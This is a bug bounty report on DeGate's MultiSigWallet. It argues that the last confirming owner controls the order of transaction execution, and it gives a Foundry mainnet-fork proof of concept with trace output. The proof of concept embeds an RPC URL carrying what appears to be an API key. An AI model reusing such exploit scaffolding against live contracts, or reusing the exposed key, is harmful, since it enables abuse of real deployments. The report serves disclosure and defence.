# 25933 - \[SC - Insight] The last person to confirm can control the exec...

Submitted on Nov 21st 2023 at 10:54:26 UTC by @yttriumzz for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #25933

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x2028834B2c0A36A918c10937EeA71BE4f932da52#code>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

```solidity
    function executeTransaction(uint transactionId)
        public
        notExecuted(transactionId)
    {
        if (isConfirmed(transactionId)) {
            Transaction tx = transactions[transactionId];
            tx.executed = true;
            if (tx.destination.call.value(tx.value)(tx.data))
                Execution(transactionId);
            else {
                ExecutionFailure(transactionId);
                tx.executed = false;
            }
        }
    }
```

The execution of `MultiSigWallet` is parallel, and as long as the number of confirmations meets the requirements, the transaction can be executed directly. In other words, the last confirmer can control the execution order of all transactions.

This is the 1st, 2nd, and 3rd transaction executed on the mainnet:

1. (BlockNo.17334967) <https://etherscan.io/tx/0x0e3d9f90b787def831c2739ba247c3be837e6f6a821d477bff4b723dfb7ddfb8>
2. (BlockNo.17334965) <https://etherscan.io/tx/0xbb2ca3acf2df04c311bffc2af961ec5bdc8a43b53ce321c7b2a68fa02f1c0368>
3. (BlockNo.17334963) <https://etherscan.io/tx/0xe10a5e946abd63104803dd158e434751ac5a83c7002d7184cb9c79235c89a5bd>

As you can see, their execution order is opposite to the submission order. It all depends on the confirmation order of the last confirmer (0xC715b8501039d3514787dC55BC09f89c293351e9).

## Impact

The impact depends on the actual transaction content and the current impact is potential. But since `MultiSigWallet` is a high-privilege address, I think it is a Medium level.

## Risk Breakdown

Difficulty to Exploit: Hard

## Recommendation

Each transaction sets a pre-transaction, and the transaction can only be executed after the pre-transaction is completed.

## References

## Proof of concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// main fork url
string constant MAINNET_RPC_URL = "https://eth-mainnet.g.alchemy.com/v2/TrnSBL14bW3BaXavojgbw69L0ZK2lbZ_";
uint256 constant MAINNET_BLOCK_NUMBER = 18614000;

// contract address
address constant ADDRESS_CONTRACT_ExchangeV3 = address(0x9C07A72177c5A05410cA338823e790876E79D73B);
address constant ADDRESS_CONTRACT_MultiSigWallet = address(0x2028834B2c0A36A918c10937EeA71BE4f932da52);
address constant ADDRESS_CONTRACT_WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

// user address
address constant ADDRESS_USER_Attacker = address(0xAACE);
address constant ADDRESS_USER_USER1 = address(0xACC1);
address constant ADDRESS_USER_USER2 = address(0xACC2);
address constant ADDRESS_USER_ExchangeV3Owner = address(0x9b93e47b7F61ad1358Bd47Cd01206708E85AE5eD);
address constant ADDRESS_USER_MultiSigWalletOwner1 = address(0xf5020ADf433645c451A4809eac0d6F680709f11B);
address constant ADDRESS_USER_MultiSigWalletOwner2 = address(0xeD530f3b8675B0a576DaAe64C004676c65368DfD);
address constant ADDRESS_USER_MultiSigWalletOwner3 = address(0xB7093FC2d926ADdE48122B70991fe68374879adf);
address constant ADDRESS_USER_MultiSigWalletOwner4 = address(0xC715b8501039d3514787dC55BC09f89c293351e9);
address constant ADDRESS_USER_MultiSigWalletOwner5 = address(0x6EF4e54E049A5FffB629063D3a9ee38ac27551C8);
address constant ADDRESS_USER_MultiSigWalletOwner6 = address(0x3Cd51A933b0803DDCcDF985A7c71C1C7357FE9Eb);

interface IExchangeV3 {
    function registerToken(address tokenAddress) external returns (uint32);
}

interface IMultiSigWallet {
    function removeOwner(address owner) external;
    function submitTransaction(address destination, uint value, bytes memory data) external returns (uint transactionId);
    function confirmTransaction(uint transactionId) external;

    function getOwners() external view returns (address[] memory owners);
}

contract YttriumzzDemo is Test {
    IExchangeV3 exchangeV3;
    IMultiSigWallet multiSigWallet;

    function setUp() public {
        vm.selectFork(vm.createFork(MAINNET_RPC_URL, MAINNET_BLOCK_NUMBER));

        exchangeV3 = IExchangeV3(ADDRESS_CONTRACT_ExchangeV3);
        multiSigWallet = IMultiSigWallet(ADDRESS_CONTRACT_MultiSigWallet);

        // as gas fee
        vm.deal(ADDRESS_USER_Attacker, 1 ether);
        // vm.deal(ADDRESS_USER_USER1, 1 ether);
        // vm.deal(ADDRESS_USER_USER2, 1 ether);
        vm.deal(ADDRESS_USER_ExchangeV3Owner, 1 ether);
        vm.deal(ADDRESS_USER_MultiSigWalletOwner1, 1 ether);
        vm.deal(ADDRESS_USER_MultiSigWalletOwner2, 1 ether);
        vm.deal(ADDRESS_USER_MultiSigWalletOwner3, 1 ether);
        vm.deal(ADDRESS_USER_MultiSigWalletOwner4, 1 ether);
        vm.deal(ADDRESS_USER_MultiSigWalletOwner5, 1 ether);
        vm.deal(ADDRESS_USER_MultiSigWalletOwner6, 1 ether);
    }

    function testYttriumzz0002() public {
        // The POC assumes the following scenario to reveal the impact of execution order:
        //   Execute1 transfer 0.5ETH to User1
        //   Execute2 to transfer the remaining wallet to User2
        //   Expect User1 and User2 to receive 0.5 ETH each

        vm.deal(ADDRESS_CONTRACT_MultiSigWallet, 1 ether);

        // Execute1
        vm.startPrank(ADDRESS_USER_MultiSigWalletOwner1);
        uint transaction1Id = multiSigWallet.submitTransaction(ADDRESS_USER_USER1, 0.5 ether, "");
        vm.stopPrank();

        vm.startPrank(ADDRESS_USER_MultiSigWalletOwner2);
        multiSigWallet.confirmTransaction(transaction1Id);
        vm.stopPrank();

        vm.startPrank(ADDRESS_USER_MultiSigWalletOwner3);
        multiSigWallet.confirmTransaction(transaction1Id);
        vm.stopPrank();

        // Execute2
        vm.startPrank(ADDRESS_USER_MultiSigWalletOwner1);
        uint transaction2Id = multiSigWallet.submitTransaction(ADDRESS_USER_USER2, address(multiSigWallet).balance, "");
        vm.stopPrank();

        vm.startPrank(ADDRESS_USER_MultiSigWalletOwner2);
        multiSigWallet.confirmTransaction(transaction2Id);
        vm.stopPrank();

        vm.startPrank(ADDRESS_USER_MultiSigWalletOwner3);
        multiSigWallet.confirmTransaction(transaction2Id);
        vm.stopPrank();

        // The Owner4 control the execution order
        vm.startPrank(ADDRESS_USER_MultiSigWalletOwner4);
        multiSigWallet.confirmTransaction(transaction2Id);
        multiSigWallet.confirmTransaction(transaction1Id);
        vm.stopPrank();

        // Result
        console.log("User1 balace: %s", ADDRESS_USER_USER1.balance);
        console.log("User2 balace: %s", ADDRESS_USER_USER2.balance);
    }
}

```

Output:

```shell
$ forge test --match-test testYttriumzz0002 -vvvv
[⠰] Compiling...
No files changed, compilation skipped

Running 1 test for test/YttriumzzDemo.sol:YttriumzzDemo
[PASS] testYttriumzz0002() (gas: 534694)
Logs:
  User1 balace: 0
  User2 balace: 1000000000000000000

Traces:
  [534694] YttriumzzDemo::testYttriumzz0002()
    ├─ [0] VM::deal(0x2028834B2c0A36A918c10937EeA71BE4f932da52, 1000000000000000000 [1e18])
    │   └─ ← ()
    ├─ [0] VM::startPrank(0xf5020ADf433645c451A4809eac0d6F680709f11B)
    │   └─ ← ()
    ├─ [135001] 0x2028834B2c0A36A918c10937EeA71BE4f932da52::submitTransaction(0x000000000000000000000000000000000000Acc1, 500000000000000000 [5e17], 0x)
    │   ├─ emit Submission()
    │   ├─ emit Confirmation()
    │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000005
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0xeD530f3b8675B0a576DaAe64C004676c65368DfD)
    │   └─ ← ()
    ├─ [30977] 0x2028834B2c0A36A918c10937EeA71BE4f932da52::confirmTransaction(5)
    │   ├─ emit Confirmation()
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0xB7093FC2d926ADdE48122B70991fe68374879adf)
    │   └─ ← ()
    ├─ [30991] 0x2028834B2c0A36A918c10937EeA71BE4f932da52::confirmTransaction(5)
    │   ├─ emit Confirmation()
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0xf5020ADf433645c451A4809eac0d6F680709f11B)
    │   └─ ← ()
    ├─ [112201] 0x2028834B2c0A36A918c10937EeA71BE4f932da52::submitTransaction(0x000000000000000000000000000000000000aCc2, 1000000000000000000 [1e18], 0x)
    │   ├─ emit Submission()
    │   ├─ emit Confirmation()
    │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000006
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0xeD530f3b8675B0a576DaAe64C004676c65368DfD)
    │   └─ ← ()
    ├─ [28977] 0x2028834B2c0A36A918c10937EeA71BE4f932da52::confirmTransaction(6)
    │   ├─ emit Confirmation()
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0xB7093FC2d926ADdE48122B70991fe68374879adf)
    │   └─ ← ()
    ├─ [28991] 0x2028834B2c0A36A918c10937EeA71BE4f932da52::confirmTransaction(6)
    │   ├─ emit Confirmation()
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0xC715b8501039d3514787dC55BC09f89c293351e9)
    │   └─ ← ()
    ├─ [85310] 0x2028834B2c0A36A918c10937EeA71BE4f932da52::confirmTransaction(6)
    │   ├─ emit Confirmation()
    │   ├─ [0] 0x000000000000000000000000000000000000aCc2::fallback()
    │   │   └─ ← ()
    │   ├─ emit Execution()
    │   └─ ← ()
    ├─ [66820] 0x2028834B2c0A36A918c10937EeA71BE4f932da52::confirmTransaction(5)
    │   ├─ emit Confirmation()
    │   ├─ [0] 0x000000000000000000000000000000000000Acc1::fallback()
    │   │   └─ ← "EvmError: OutOfFund"
    │   ├─ emit ExecutionFailure()
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] console::9710a9d0(00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001055736572312062616c6163653a20257300000000000000000000000000000000) [staticcall]
    │   └─ ← ()
    ├─ [0] console::9710a9d0(00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000000000000000000001055736572322062616c6163653a20257300000000000000000000000000000000) [staticcall]
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.13s

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```
